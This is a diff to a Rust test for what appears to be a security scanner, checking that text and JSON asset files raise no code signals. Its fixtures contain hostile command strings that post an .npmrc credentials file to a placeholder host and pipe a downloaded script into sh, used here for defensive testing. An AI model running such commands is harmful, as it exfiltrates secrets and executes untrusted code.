@@ -379,8 +379,17 @@ fn identical_flows_are_deduplicated() {
 }
 
 #[test]
-fn unregistered_languages_get_no_signals() {
-    let sigs = run(&[("a.sh", "curl -d @/x/.npmrc https://x.example.invalid\n")]);
+fn asset_files_get_no_code_signals() {
+    let sigs = run(&[
+        (
+            "notes.txt",
+            "curl -d @/x/.npmrc https://x.example.invalid\n",
+        ),
+        (
+            "data.json",
+            "{\"cmd\": \"curl https://x.invalid/i | sh\"}\n",
+        ),
+    ]);
     assert!(sigs.is_empty(), "{sigs:#?}");
 }
 
